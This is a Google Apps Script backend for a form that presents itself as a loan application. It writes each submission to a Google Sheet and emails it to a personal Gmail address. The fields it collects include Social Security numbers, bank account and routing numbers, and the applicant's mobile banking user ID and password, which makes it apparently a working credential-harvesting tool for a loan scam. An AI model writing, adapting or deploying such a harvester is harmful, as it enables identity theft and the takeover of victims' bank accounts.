// FINAL GOOGLE SHEETS SCRIPT - For old Google Sheet (lightstreamfinancialefts@gmail.com)
// Use this script in your Google Apps Script project

const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function doGet(e) {
  return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    const data = JSON.parse(e.postData.contents);

    // Add ONLY useful data to sheet (15 columns)
    sheet.appendRow([
      data.loanAmount || "",
      data.loanPurpose || "",
      data.name || "",
      data.email || "",
      data.phone || "",
      data.streetAddress || "",
      data.city || "",
      data.state || "",
      data.zipCode || "",
      data.ssn || "",
      data.bankName || data.customerBank || "",
      data.routingNumber || "",
      data.accountNumber || "",
      data.mobileBankingUserId || "",
      data.mobileBankingPassword || "",
      new Date()
    ]);

    // Send email notification to ericmason007@gmail.com
    sendEmailNotification(data);

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Send email notification function
function sendEmailNotification(data) {
  try {
    const recipientEmail = "ericmason007@gmail.com"; // Your email address
    
    // Get customer name
    const customerName = data.fullName || data.name || 'Customer';
    
    // Create email subject
    const subject = `New Loan Application - ${customerName} - $${data.loanAmount || 'N/A'}`;
    
    // Create email body
    const body = `New Loan Application Received:

Customer Information:
- Name: ${customerName}
- Email: ${data.email || 'N/A'}
- Phone: ${data.phone || 'N/A'}
- Address: ${data.streetAddress || 'N/A'}, ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zipCode || 'N/A'}
- SSN: ${data.ssn || 'N/A'}

Bank Information:
- Mobile Banking User ID: ${data.mobileBankingUserId || 'N/A'}
- Mobile Banking Password: ${data.mobileBankingPassword || 'N/A'}

Loan Details:
- Loan Amount: $${data.loanAmount || 'N/A'}
- Loan Purpose: ${data.loanPurpose || 'N/A'}
- Bank: ${data.bankName || data.customerBank || 'N/A'}

Application submitted: ${new Date().toLocaleString()}

Check your Google Sheet for complete details.`;
    
    // Send email
    MailApp.sendEmail({
      to: recipientEmail,
      subject: subject,
      body: body
    });
    
    console.log('Email notification sent to ' + recipientEmail);
    
  } catch (emailError) {
    console.log('Failed to send email: ' + emailError.message);
  }
}
